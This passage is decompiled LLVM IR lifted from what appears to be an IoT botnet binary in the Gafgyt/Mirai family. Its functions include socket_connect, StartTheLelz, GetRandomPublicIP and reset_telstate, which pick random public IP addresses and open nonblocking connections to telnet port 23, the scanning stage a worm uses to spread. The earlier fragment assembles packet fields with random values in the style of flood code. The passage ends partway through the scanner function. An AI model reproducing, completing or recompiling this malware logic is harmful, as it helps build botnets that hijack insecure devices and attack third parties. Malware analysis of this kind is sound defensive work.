  %v3_c8f4 = load i32, i32* @fp, align 4
  store i32 %tmp4, i32* %r2.global-to-local, align 4
  %v2_c914 = load i8, i8* %arg1, align 1
  %v4_c91c = zext i8 %v2_c914 to i32
  %v1_c920 = and i32 %v4_c91c, 240
  %v1_c924 = or i32 %v1_c920, 5
  store i32 %v1_c924, i32* %r3.global-to-local, align 4
  %v1_c930 = trunc i32 %v1_c924 to i8
  store i8 %v1_c930, i8* %arg1, align 1
  store i32 %tmp4, i32* %r2.global-to-local, align 4
  store i8 69, i8* %arg1, align 1
  %v3_c960 = add i32 %tmp4, 1
  %v4_c960 = inttoptr i32 %v3_c960 to i8*
  store i8 0, i8* %v4_c960, align 1
  %v3_c964 = load i32, i32* %stack_var_0, align 4
  %fold = add i32 %v3_c964, 20
  %v3_c978 = urem i32 %fold, 65536
  store i32 %v3_c978, i32* %r3.global-to-local, align 4
  store i32 %tmp4, i32* %r2.global-to-local, align 4
  %v1_c980 = trunc i32 %fold to i8
  %v3_c980 = add i32 %tmp4, 2
  %v4_c980 = inttoptr i32 %v3_c980 to i8*
  store i8 %v1_c980, i8* %v4_c980, align 1
  %v0_c984 = load i32, i32* %r3.global-to-local, align 4
  %v3_c984 = sdiv i32 %v0_c984, 256
  store i32 %v3_c984, i32* %r3.global-to-local, align 4
  %v1_c988 = trunc i32 %v3_c984 to i8
  %v2_c988 = load i32, i32* %r2.global-to-local, align 4
  %v3_c988 = add i32 %v2_c988, 3
  %v4_c988 = inttoptr i32 %v3_c988 to i8*
  store i8 %v1_c988, i8* %v4_c988, align 1
  %v0_c98c = call i32 @rand_cmwc()
  %v3_c998 = urem i32 %v0_c98c, 65536
  store i32 %v3_c998, i32* %r3.global-to-local, align 4
  store i32 %tmp4, i32* %r2.global-to-local, align 4
  %v1_c9a0 = trunc i32 %v0_c98c to i8
  %v3_c9a0 = add i32 %tmp4, 4
  %v4_c9a0 = inttoptr i32 %v3_c9a0 to i8*
  store i8 %v1_c9a0, i8* %v4_c9a0, align 1
  %v0_c9a4 = load i32, i32* %r3.global-to-local, align 4
  %v3_c9a43 = udiv i32 %v0_c9a4, 256
  %v1_c9a8 = trunc i32 %v3_c9a43 to i8
  %v2_c9a8 = load i32, i32* %r2.global-to-local, align 4
  %v3_c9a8 = add i32 %v2_c9a8, 5
  %v4_c9a8 = inttoptr i32 %v3_c9a8 to i8*
  store i8 %v1_c9a8, i8* %v4_c9a8, align 1
  store i32 %tmp4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_c9b4 = add i32 %tmp4, 6
  %v4_c9b4 = inttoptr i32 %v3_c9b4 to i8*
  store i8 0, i8* %v4_c9b4, align 1
  %v0_c9b8 = load i32, i32* %r3.global-to-local, align 4
  %v1_c9b8 = trunc i32 %v0_c9b8 to i8
  %v2_c9b8 = load i32, i32* %r2.global-to-local, align 4
  %v3_c9b8 = add i32 %v2_c9b8, 7
  %v4_c9b8 = inttoptr i32 %v3_c9b8 to i8*
  store i8 %v1_c9b8, i8* %v4_c9b8, align 1
  %v3_c9c4 = add i32 %tmp4, 8
  %v4_c9c4 = inttoptr i32 %v3_c9c4 to i8*
  store i8 -1, i8* %v4_c9c4, align 1
  %v3_c9d0 = add i32 %tmp4, 9
  %v4_c9d0 = inttoptr i32 %v3_c9d0 to i8*
  store i8 %tmp, i8* %v4_c9d0, align 1
  store i32 %tmp4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_c9dc = add i32 %tmp4, 10
  %v4_c9dc = inttoptr i32 %v3_c9dc to i8*
  store i8 0, i8* %v4_c9dc, align 1
  %v0_c9e0 = load i32, i32* %r3.global-to-local, align 4
  %v1_c9e0 = trunc i32 %v0_c9e0 to i8
  %v2_c9e0 = load i32, i32* %r2.global-to-local, align 4
  %v3_c9e0 = add i32 %v2_c9e0, 11
  %v4_c9e0 = inttoptr i32 %v3_c9e0 to i8*
  store i8 %v1_c9e0, i8* %v4_c9e0, align 1
  %v2_c9ec = add i32 %tmp4, 12
  %v3_c9ec = inttoptr i32 %v2_c9ec to i32*
  store i32 %arg3, i32* %v3_c9ec, align 4
  store i32 %tmp4, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v2_c9f8 = add i32 %tmp4, 16
  %v3_c9f8 = inttoptr i32 %v2_c9f8 to i32*
  store i32 %arg2, i32* %v3_c9f8, align 4
  store i32 %v3_c8f4, i32* @fp, align 4
  ret i32 %v0_c98c

; uselistorder directives
  uselistorder i32 %v0_c98c, { 1, 2, 0 }
  uselistorder i32 %v3_c984, { 1, 0 }
  uselistorder i32 %fold, { 1, 0 }
  uselistorder i32 %tmp4, { 1, 0, 2, 4, 3, 5, 6, 8, 7, 10, 9, 12, 11, 13, 14, 15 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32 %arg4, { 1, 0 }
}

define i32 @sclose(i32 %arg1) local_unnamed_addr {
entry:
  %v8_ca20 = icmp sgt i32 %arg1, 2
  br i1 %v8_ca20, label %dec_label_pc_ca30, label %dec_label_pc_ca40

dec_label_pc_ca30:                                ; preds = %entry
  %v1_ca34 = call i32 @__libc_close(i32 %arg1)
  br label %dec_label_pc_ca40

dec_label_pc_ca40:                                ; preds = %entry, %dec_label_pc_ca30
  %storemerge1 = phi i32 [ 0, %dec_label_pc_ca30 ], [ 1, %entry ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder label %dec_label_pc_ca40, { 1, 0 }
}

define i32 @socket_connect(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_ca54 = load i32, i32* @fp, align 4
  store i32 51804, i32* %stack_var_-4, align 4
  %v2_ca58 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_ca58, i32* @fp, align 4
  store i32 1, i32* %stack_var_-44, align 4
  %v1_ca80 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_ca90 = icmp eq i32 %v1_ca80, 0
  br i1 %v2_ca90, label %dec_label_pc_ca98, label %dec_label_pc_caa4

dec_label_pc_ca98:                                ; preds = %entry
  br label %dec_label_pc_cb8c

dec_label_pc_caa4:                                ; preds = %entry
  %tmp = sext i8 %arg2 to i32
  %v1_caa8 = add i32 %v1_ca80, 16
  %v2_caa8 = inttoptr i32 %v1_caa8 to i32*
  %v3_caa8 = load i32, i32* %v2_caa8, align 4
  %v1_caac = inttoptr i32 %v3_caa8 to i32*
  %v2_caac = load i32, i32* %v1_caac, align 4
  %v1_cab4 = add i32 %v1_ca80, 12
  %v2_cab4 = inttoptr i32 %v1_cab4 to i32*
  %v3_cab4 = load i32, i32* %v2_cab4, align 4
  store i32 %v3_cab4, i32* @r2, align 4
  %v2_cac0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cacc = call i32 @bcopy(i32 %v2_caac, i32 %v2_cac0, i32 %v3_cab4)
  %v1_cae4 = call i32 @htons(i32 %tmp)
  store i32 2, i32* %stack_var_-40, align 4
  %v0_cb14 = call i32 @socket()
  %v6_cb3c = call i32 @__GI_setsockopt(i32 %v0_cb14, i32 6, i32 1, i32* nonnull %stack_var_-44, i32 4)
  %v3_cb44 = icmp eq i32 %v0_cb14, -1
  br i1 %v3_cb44, label %dec_label_pc_cb4c, label %dec_label_pc_cb58

dec_label_pc_cb4c:                                ; preds = %dec_label_pc_caa4
  br label %dec_label_pc_cb8c

dec_label_pc_cb58:                                ; preds = %dec_label_pc_caa4
  %v3_cb68 = bitcast i32* %stack_var_-40 to %sockaddr*
  %v4_cb68 = call i32 @__libc_connect(i32 %v0_cb14, %sockaddr* %v3_cb68, i32 16)
  %v3_cb70 = icmp eq i32 %v4_cb68, -1
  br i1 %v3_cb70, label %dec_label_pc_cb78, label %dec_label_pc_cb84

dec_label_pc_cb78:                                ; preds = %dec_label_pc_cb58
  br label %dec_label_pc_cb8c

dec_label_pc_cb84:                                ; preds = %dec_label_pc_cb58
  br label %dec_label_pc_cb8c

dec_label_pc_cb8c:                                ; preds = %dec_label_pc_cb78, %dec_label_pc_cb4c, %dec_label_pc_ca98, %dec_label_pc_cb84
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_ca98 ], [ 0, %dec_label_pc_cb4c ], [ 0, %dec_label_pc_cb78 ], [ %v0_cb14, %dec_label_pc_cb84 ]
  store i32 %v3_ca54, i32* @fp, align 4
  ret i32 %stack_var_-56.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_cb8c, { 3, 0, 1, 2 }
}

define i32 @StartTheLelz(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-340 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-324 = alloca i32, align 4
  %stack_var_-604 = alloca i32, align 4
  %stack_var_-612 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_cb9c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_cb9c, i32* %ip.global-to-local, align 4
  %v3_cba0 = load i32, i32* @r4, align 4
  store i32 %v3_cba0, i32* %stack_var_-24, align 4
  store i32 52136, i32* %stack_var_-4, align 4
  %v19_cba0 = ptrtoint i32* %stack_var_-24 to i32
  %v2_cba4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_cba4, i32* @fp, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v2_cbc0 = call i32 @__GI_time(i32* null)
  store i32 %v2_cbc0, i32* %r3.global-to-local, align 4
  store i32 %v2_cbc0, i32* @r4, align 4
  %v0_cbcc = call i32 @rand_cmwc()
  %v0_cbd4 = load i32, i32* @r4, align 4
  %v2_cbd4 = xor i32 %v0_cbd4, %v0_cbcc
  store i32 %v2_cbd4, i32* %r3.global-to-local, align 4
  %v1_cbdc = call i32 @srand(i32 %v2_cbd4)
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-612, align 4
  %v1_cbf4 = call i32 @htons(i32 23)
  %v2_cc0c = ptrtoint i32* %stack_var_-604 to i32
  store i32 %v2_cc0c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %stack_var_-604, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_cc28 = call i32 @malloc(i32 1025)
  store i32 1025, i32* %r3.global-to-local, align 4
  store i32 1025, i32* @r2, align 4
  %v2_cc50 = inttoptr i32 %v1_cc28 to i8*
  %v3_cc50 = call i32 @__GI_memset(i8* %v2_cc50, i32 0)
  %v2_cc60 = mul i32 %arg2, 28
  %v1_cc64 = or i32 %v2_cc60, 3
  %v1_cc68 = add i32 %v1_cc64, 3
  %v3_cc6c = and i32 %v1_cc68, -4
  %v1_cc74 = load i32, i32* @sp, align 4
  %v2_cc74 = sub i32 %v1_cc74, %v3_cc6c
  %v1_cc84 = add i32 %v2_cc74, 7
  %v3_cc88 = and i32 %v1_cc84, -4
  %v2_ccac = mul i32 %arg2, 5
  store i32 %v2_ccac, i32* %r3.global-to-local, align 4
  store i32 %v2_ccac, i32* @r2, align 4
  %v2_ccc0 = inttoptr i32 %v3_cc88 to i8*
  %v3_ccc0 = call i32 @__GI_memset(i8* %v2_ccc0, i32 0)
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v5_cda061 = icmp sgt i32 %arg2, 0
  br i1 %v5_cda061, label %dec_label_pc_ccd0, label %dec_label_pc_cda4

dec_label_pc_ccd0:                                ; preds = %entry, %dec_label_pc_ccd0
  %storemerge462 = phi i32 [ %v1_cd8c, %dec_label_pc_ccd0 ], [ 0, %entry ]
  %v2_cce0 = mul i32 %storemerge462, 28
  %v2_cce4 = add i32 %v2_cce0, %v3_cc88
  store i32 %v2_cce4, i32* %r3.global-to-local, align 4
  %v2_ccec = inttoptr i32 %v2_cce4 to i32*
  store i32 0, i32* %v2_ccec, align 4
  %v0_ccf0 = load i32, i32* %r3.global-to-local, align 4
  %v1_ccf0 = add i32 %v0_ccf0, 4
  store i32 %v1_ccf0, i32* %r3.global-to-local, align 4
  %v2_ccf8 = inttoptr i32 %v1_ccf0 to i32*
  store i32 0, i32* %v2_ccf8, align 4
  %v0_ccfc = load i32, i32* %r3.global-to-local, align 4
  %v1_ccfc = add i32 %v0_ccfc, 4
  store i32 %v1_ccfc, i32* %r3.global-to-local, align 4
  %v2_cd04 = inttoptr i32 %v1_ccfc to i32*
  store i32 0, i32* %v2_cd04, align 4
  %v0_cd08 = load i32, i32* %r3.global-to-local, align 4
  %v1_cd08 = add i32 %v0_cd08, 4
  store i32 %v1_cd08, i32* %r3.global-to-local, align 4
  %v2_cd10 = inttoptr i32 %v1_cd08 to i32*
  store i32 0, i32* %v2_cd10, align 4
  %v0_cd14 = load i32, i32* %r3.global-to-local, align 4
  %v1_cd14 = add i32 %v0_cd14, 4
  store i32 %v1_cd14, i32* %r3.global-to-local, align 4
  %v2_cd1c = inttoptr i32 %v1_cd14 to i32*
  store i32 0, i32* %v2_cd1c, align 4
  %v0_cd20 = load i32, i32* %r3.global-to-local, align 4
  %v1_cd20 = add i32 %v0_cd20, 4
  store i32 %v1_cd20, i32* %r3.global-to-local, align 4
  %v2_cd28 = inttoptr i32 %v1_cd20 to i32*
  store i32 0, i32* %v2_cd28, align 4
  %v0_cd2c = load i32, i32* %r3.global-to-local, align 4
  %v1_cd2c = add i32 %v0_cd2c, 4
  %v2_cd34 = inttoptr i32 %v1_cd2c to i32*
  store i32 0, i32* %v2_cd34, align 4
  %v3_cd5c = add i32 %v2_cce4, 9
  %v4_cd5c = inttoptr i32 %v3_cd5c to i8*
  store i8 1, i8* %v4_cd5c, align 1
  %v2_cd7c = add i32 %v2_cce4, 24
  %v2_cd84 = inttoptr i32 %v2_cd7c to i32*
  store i32 %v1_cc28, i32* %v2_cd84, align 4
  %v1_cd8c = add nuw nsw i32 %storemerge462, 1
  store i32 %v1_cd8c, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v5_cda0 = icmp slt i32 %v1_cd8c, %arg2
  br i1 %v5_cda0, label %dec_label_pc_ccd0, label %dec_label_pc_cda4

dec_label_pc_cda4:                                ; preds = %dec_label_pc_ccd0, %entry
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_cdac

dec_label_pc_cdac:                                ; preds = %dec_label_pc_cdac, %dec_label_pc_cda4
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_cda4 ], [ %v1_cdb0, %dec_label_pc_cdac ]
  %v1_cdb0 = add i32 %stack_var_-56.0, 1
  store i32 %v1_cdb0, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([10 x i8*]* @global_var_2d1a0.329 to i32), i32* %r3.global-to-local, align 4
  %v4_cdc0 = mul i32 %v1_cdb0, 4
  %v5_cdc0 = add i32 %v4_cdc0, ptrtoint ([10 x i8*]* @global_var_2d1a0.329 to i32)
  %v6_cdc0 = inttoptr i32 %v5_cdc0 to i32*
  %v7_cdc0 = load i32, i32* %v6_cdc0, align 4
  store i32 %v7_cdc0, i32* %r3.global-to-local, align 4
  %v2_cdc4 = icmp eq i32 %v7_cdc0, 0
  br i1 %v2_cdc4, label %dec_label_pc_cdcc.preheader, label %dec_label_pc_cdac

dec_label_pc_cdcc.preheader:                      ; preds = %dec_label_pc_cdac
  %v2_ce54 = add i32 %v3_cc88, 8
  %v2_d188 = add i32 %v3_cc88, 4
  %v3_d278 = bitcast i32* %stack_var_-612 to %sockaddr*
  %v2_d2e8 = ptrtoint i32* %stack_var_-324 to i32
  %v2_d3e4 = ptrtoint i32* %stack_var_-332 to i32
  %v2_d440 = ptrtoint i32* %stack_var_-340 to i32
  %v2_d444 = ptrtoint i32* %stack_var_-336 to i32
  %v2_d560 = add i32 %v3_cc88, 16
  %v2_d5dc = add i32 %v3_cc88, 24
  br label %dec_label_pc_cdcc

dec_label_pc_cdcc:                                ; preds = %dec_label_pc_cdcc, %dec_label_pc_df5c, %dec_label_pc_cdcc.preheader
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  br i1 %v5_cda061, label %dec_label_pc_cdd8, label %dec_label_pc_cdcc

dec_label_pc_cdd8:                                ; preds = %dec_label_pc_cdcc, %dec_label_pc_df5c
  %storemerge553 = phi i32 [ %v1_df60, %dec_label_pc_df5c ], [ 0, %dec_label_pc_cdcc ]
  %v3_cde4 = mul i32 %storemerge553, 4
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  %v2_cdec = mul i32 %storemerge553, 28
  %v2_cdf0 = add i32 %v2_cdec, %v3_cc88
  %v2_cdf4 = add i32 %v2_cdf0, 16
  store i32 %v2_cdf4, i32* %r3.global-to-local, align 4
  %v1_cdf8 = inttoptr i32 %v2_cdf4 to i32*
  %v2_cdf8 = load i32, i32* %v1_cdf8, align 4
  store i32 %v2_cdf8, i32* %r3.global-to-local, align 4
  %v2_cdfc = icmp eq i32 %v2_cdf8, 0
  br i1 %v2_cdfc, label %dec_label_pc_ce04, label %dec_label_pc_ce3c

dec_label_pc_ce04:                                ; preds = %dec_label_pc_cdd8
  store i32 %storemerge553, i32* @r4, align 4
  %v2_ce0c = call i32 @__GI_time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_ce20 = load i32, i32* @r4, align 4
  %v3_ce24 = mul i32 %v0_ce20, 4
  store i32 %v3_ce24, i32* %r2.global-to-local, align 4
  %v2_ce2c = mul i32 %v0_ce20, 28
  %v2_ce34 = add i32 %v2_d560, %v2_ce2c
  store i32 %v2_ce34, i32* %r3.global-to-local, align 4
  %v2_ce38 = inttoptr i32 %v2_ce34 to i32*
  store i32 %v2_ce0c, i32* %v2_ce38, align 4
  br label %dec_label_pc_ce3c

dec_label_pc_ce3c:                                ; preds = %dec_label_pc_cdd8, %dec_label_pc_ce04
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  %v2_ce58 = add i32 %v2_ce54, %v2_cdec
  store i32 %v2_ce58, i32* %r3.global-to-local, align 4
  %v1_ce5c = inttoptr i32 %v2_ce58 to i8*
  %v2_ce5c = load i8, i8* %v1_ce5c, align 4
  %v3_ce5c = sext i8 %v2_ce5c to i32
  %v4_ce5c = zext i8 %v2_ce5c to i32
  store i32 %v4_ce5c, i32* %r3.global-to-local, align 4
  switch i32 %v3_ce5c, label %dec_label_pc_df5c [
    i32 0, label %dec_label_pc_ce8c
    i32 1, label %dec_label_pc_d2fc.lr.ph
    i32 2, label %dec_label_pc_d5a8
    i32 3, label %dec_label_pc_d6f4
    i32 4, label %dec_label_pc_d848
    i32 5, label %dec_label_pc_d994
    i32 6, label %dec_label_pc_dae8
    i32 7, label %dec_label_pc_ddec
  ]

dec_label_pc_ce8c:                                ; preds = %dec_label_pc_ce3c
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  %v2_cea8 = add i32 %v2_cdf0, 8
  store i32 %v2_cea8, i32* %r3.global-to-local, align 4
  %v1_ceac = add i32 %v2_cdf0, 9
  %v2_ceac = inttoptr i32 %v1_ceac to i8*
  %v3_ceac = load i8, i8* %v2_ceac, align 1
  %v7_ceb0 = icmp eq i8 %v3_ceac, 1
  store i32 %storemerge553, i32* %r3.global-to-local, align 4
  br i1 %v7_ceb0, label %dec_label_pc_ceb8, label %dec_label_pc_cfa4

dec_label_pc_ceb8:                                ; preds = %dec_label_pc_ce8c
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  %v2_ced4 = add i32 %v2_cdf0, 24
  store i32 %v2_ced4, i32* %r3.global-to-local, align 4
  %v1_ced8 = inttoptr i32 %v2_ced4 to i32*
  %v2_ced8 = load i32, i32* %v1_ced8, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v2_cefc = inttoptr i32 %v2_cdf0 to i32*
  store i32 0, i32* %v2_cefc, align 4
  %v0_cf00 = load i32, i32* %r3.global-to-local, align 4
  %v1_cf00 = add i32 %v0_cf00, 4
  store i32 %v1_cf00, i32* %r3.global-to-local, align 4
  %v2_cf08 = inttoptr i32 %v1_cf00 to i32*
  store i32 0, i32* %v2_cf08, align 4
  %v0_cf0c = load i32, i32* %r3.global-to-local, align 4
  %v1_cf0c = add i32 %v0_cf0c, 4
  store i32 %v1_cf0c, i32* %r3.global-to-local, align 4
  %v2_cf14 = inttoptr i32 %v1_cf0c to i32*
  store i32 0, i32* %v2_cf14, align 4
  %v0_cf18 = load i32, i32* %r3.global-to-local, align 4
  %v1_cf18 = add i32 %v0_cf18, 4
  store i32 %v1_cf18, i32* %r3.global-to-local, align 4
  %v2_cf20 = inttoptr i32 %v1_cf18 to i32*
  store i32 0, i32* %v2_cf20, align 4
  %v0_cf24 = load i32, i32* %r3.global-to-local, align 4
  %v1_cf24 = add i32 %v0_cf24, 4
  store i32 %v1_cf24, i32* %r3.global-to-local, align 4
  %v2_cf2c = inttoptr i32 %v1_cf24 to i32*
  store i32 0, i32* %v2_cf2c, align 4
  %v0_cf30 = load i32, i32* %r3.global-to-local, align 4
  %v1_cf30 = add i32 %v0_cf30, 4
  store i32 %v1_cf30, i32* %r3.global-to-local, align 4
  %v2_cf38 = inttoptr i32 %v1_cf30 to i32*
  store i32 0, i32* %v2_cf38, align 4
  %v0_cf3c = load i32, i32* %r3.global-to-local, align 4
  %v1_cf3c = add i32 %v0_cf3c, 4
  %v2_cf44 = inttoptr i32 %v1_cf3c to i32*
  store i32 0, i32* %v2_cf44, align 4
  store i32 %v2_ced4, i32* %r2.global-to-local, align 4
  store i32 %v2_ced8, i32* %r3.global-to-local, align 4
  store i32 %v2_ced8, i32* %v1_ced8, align 4
  store i32 %storemerge553, i32* @r4, align 4
  %v5_cf74 = call i32 @GetRandomPublicIP(i32 24, i32 %v3_cc88, i32 %v2_ced4, i32 %v2_ced8, i32 %v2_ced8)
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_cf84 = load i32, i32* @r4, align 4
  %v3_cf88 = mul i32 %v0_cf84, 4
  store i32 %v3_cf88, i32* %r2.global-to-local, align 4
  %v2_cf90 = mul i32 %v0_cf84, 28
  %v2_cf98 = add i32 %v2_d188, %v2_cf90
  store i32 %v2_cf98, i32* %r3.global-to-local, align 4
  %v2_cf9c = inttoptr i32 %v2_cf98 to i32*
  store i32 %v5_cf74, i32* %v2_cf9c, align 4
  br label %dec_label_pc_d130

dec_label_pc_cfa4:                                ; preds = %dec_label_pc_ce8c
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cea8, i32* %r3.global-to-local, align 4
  %v3_cfc4 = load i8, i8* %v2_ceac, align 1
  %v4_cfc4 = zext i8 %v3_cfc4 to i32
  store i32 %v4_cfc4, i32* %r3.global-to-local, align 4
  %v2_cfc8 = icmp eq i8 %v3_cfc4, 0
  br i1 %v2_cfc8, label %dec_label_pc_cfd0, label %dec_label_pc_d130

dec_label_pc_cfd0:                                ; preds = %dec_label_pc_cfa4
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cea8, i32* %r3.global-to-local, align 4
  %v1_cff4 = add i32 %v2_cdf0, 11
  %v2_cff4 = inttoptr i32 %v1_cff4 to i8*
  %v3_cff4 = load i8, i8* %v2_cff4, align 1
  %v1_cff8 = add i8 %v3_cff4, 1
  store i8 %v1_cff8, i8* %v2_cff4, align 1
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cea8, i32* %r3.global-to-local, align 4
  %v1_d04c = add i32 %v2_cdf0, 10
  %v2_d04c = inttoptr i32 %v1_d04c to i8*
  %v3_d04c = load i8, i8* %v2_d04c, align 2
  %v1_d050 = add i8 %v3_d04c, 1
  store i32 %v3_cc88, i32* %ip.global-to-local, align 4
  store i8 %v1_d050, i8* %v2_d04c, align 2
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cea8, i32* %r3.global-to-local, align 4
  %v3_d0a0 = load i8, i8* %v2_cff4, align 1
  %v7_d0a4 = icmp eq i8 %v3_d0a0, 3
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  br i1 %v7_d0a4, label %dec_label_pc_d0ac, label %dec_label_pc_d0d8

dec_label_pc_d0ac:                                ; preds = %dec_label_pc_cfd0
  store i32 %v2_cea8, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i8 1, i8* %v2_ceac, align 1
  br label %dec_label_pc_df5c

dec_label_pc_d0d8:                                ; preds = %dec_label_pc_cfd0
  store i32 %v2_cea8, i32* %r3.global-to-local, align 4
  %v3_d0f8 = load i8, i8* %v2_d04c, align 2
  %v4_d0f8 = zext i8 %v3_d0f8 to i32
  store i32 %v4_d0f8, i32* %r3.global-to-local, align 4
  %v7_d0fc = icmp eq i8 %v3_d0f8, 3
  br i1 %v7_d0fc, label %dec_label_pc_d104, label %dec_label_pc_d130

dec_label_pc_d104:                                ; preds = %dec_label_pc_d0d8
  store i32 %v2_cea8, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i8 1, i8* %v2_ceac, align 1
  br label %dec_label_pc_df5c

dec_label_pc_d130:                                ; preds = %dec_label_pc_d0d8, %dec_label_pc_cfa4, %dec_label_pc_ceb8
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-612, align 4
  %v1_d144 = call i32 @htons(i32 23)
  store i32 0, i32* %stack_var_-604, align 4
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  %v2_d18c = add i32 %v2_d188, %v2_cdec
  store i32 %v2_d18c, i32* %r3.global-to-local, align 4
  %v1_d190 = inttoptr i32 %v2_d18c to i32*
  %v2_d190 = load i32, i32* %v1_d190, align 4
  store i32 %v2_d190, i32* %r3.global-to-local, align 4
  store i32 %storemerge553, i32* @r4, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_d1a8 = call i32 @socket()
  %v0_d1b0 = load i32, i32* @r4, align 4
  %v2_d1bc = mul i32 %v0_d1b0, 28
  %v2_d1c0 = add i32 %v2_d1bc, %v3_cc88
  %v2_d1c4 = inttoptr i32 %v2_d1c0 to i32*
  store i32 %v0_d1a8, i32* %v2_d1c4, align 4
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v1_d1e0 = inttoptr i32 %v2_cdf0 to i32*
  %v2_d1e0 = load i32, i32* %v1_d1e0, align 4
  store i32 %v2_d1e0, i32* %r3.global-to-local, align 4
  %v7_d1e4 = icmp eq i32 %v2_d1e0, -1
  br i1 %v7_d1e4, label %dec_label_pc_df5c, label %dec_label_pc_d1ec

dec_label_pc_d1ec:                                ; preds = %dec_label_pc_d130
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v2_d204 = load i32, i32* %v1_d1e0, align 4
  store i32 %v2_d204, i32* @r4, align 4
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v2_d220 = load i32, i32* %v1_d1e0, align 4
  store i32 %v2_d220, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  %v2_d230 = call i32 @__libc_fcntl(i32 %v2_d220, i32 3)
  %v1_d238 = or i32 %v2_d230, 2048
  store i32 %v1_d238, i32* %r3.global-to-local, align 4
  %v0_d23c = load i32, i32* @r4, align 4
  store i32 %v1_d238, i32* @r2, align 4
  %v2_d248 = call i32 @__libc_fcntl(i32 %v0_d23c, i32 4)
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v2_d264 = load i32, i32* %v1_d1e0, align 4
  store i32 %v2_d264, i32* %r3.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v4_d278 = call i32 @__libc_connect(i32 %v2_d264, %sockaddr* nonnull %v3_d278, i32 16)
  store i32 %v4_d278, i32* %r3.global-to-local, align 4
  %v3_d280 = icmp eq i32 %v4_d278, -1
  br i1 %v3_d280, label %dec_label_pc_d288, label %dec_label_pc_d2c0

dec_label_pc_d288:                                ; preds = %dec_label_pc_d1ec
  %v0_d288 = call i32 @__errno_location()
  store i32 %v0_d288, i32* %r3.global-to-local, align 4
  %v1_d290 = inttoptr i32 %v0_d288 to i32*
  %v2_d290 = load i32, i32* %v1_d290, align 4
  store i32 %v2_d290, i32* %r3.global-to-local, align 4
  %v7_d294 = icmp eq i32 %v2_d290, 115
  br i1 %v7_d294, label %dec_label_pc_d2c0, label %dec_label_pc_d29c

dec_label_pc_d29c:                                ; preds = %dec_label_pc_d288
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v3_d2b8 = call i32 @reset_telstate(i32 %v2_cdf0, i32 %v3_cc88, i32 %v3_cde4)
